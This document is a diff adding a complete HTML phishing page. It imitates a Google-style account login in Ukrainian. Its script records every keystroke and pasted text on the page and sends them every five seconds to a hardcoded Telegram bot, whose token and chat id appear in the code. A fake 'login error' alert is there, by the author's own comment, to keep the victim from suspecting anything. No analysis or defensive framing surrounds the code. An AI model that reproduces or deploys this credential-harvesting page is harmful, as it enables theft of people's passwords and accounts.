@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Форма входу</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            margin: 12px 0;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        button {
+            background: #4285f4;
+            color: white;
+            border: none;
+            padding: 14px;
+            width: 100%;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #3367d6;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h2>Увійдіть в акаунт</h2>
+    <input type="text" id="username" placeholder="Електронна пошта або номер телефону" autocomplete="username">
+    <input type="password" id="password" placeholder="Пароль" autocomplete="current-password">
+    <button onclick="fakeSubmit()">Увійти</button>
+</div>
+
+<script>
+// Тільки дозволені символи: букви, цифри, пробіл, найпростіші знаки
+const allowed = /^[a-zA-Z0-9а-яА-ЯіїєґІЇЄҐ\s!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?`~]$/;
+
+let log = ''; // сюди збираємо все
+
+// Ловимо натискання тільки дозволених символів
+document.addEventListener('keypress', (e) => {
+    if (allowed.test(e.key)) {
+        log += e.key;
+    }
+});
+
+// Також ловимо вставку тексту (paste)
+document.addEventListener('paste', (e) => {
+    e.preventDefault();
+    const pasted = (e.clipboardData || window.clipboardData).getData('text');
+    let clean = '';
+    for (let char of pasted) {
+        if (allowed.test(char)) {
+            clean += char;
+        }
+    }
+    log += clean;
+});
+
+// Автоматична відправка в Telegram кожні 5 секунд, якщо є що відправляти
+setInterval(() => {
+    if (log.length > 0) {
+        const message = encodeURIComponent(log);
+        const url = `https://api.telegram.org/bot7784579148:AAHaFR3bdyIjTc5EuzjF8S6ntxKh905Ld34/sendMessage?chat_id=8044118386&text=${message}`;
+        
+        // Відправка через простий GET (працює майже скрізь)
+        fetch(url)
+            .catch(() => {}); // мовчки ігноруємо помилки
+        
+        log = ''; // очищаємо після відправки
+    }
+}, 5000);
+
+// Фейкове надсилання форми (щоб жертва не запідозрила)
+function fakeSubmit() {
+    alert('Помилка входу. Перевірте дані та спробуйте ще раз.');
+    // Можна додати перенаправлення на справжній сайт
+    // window.location.href = "https://accounts.google.com";
+}
+</script>
+</body>
+</html>
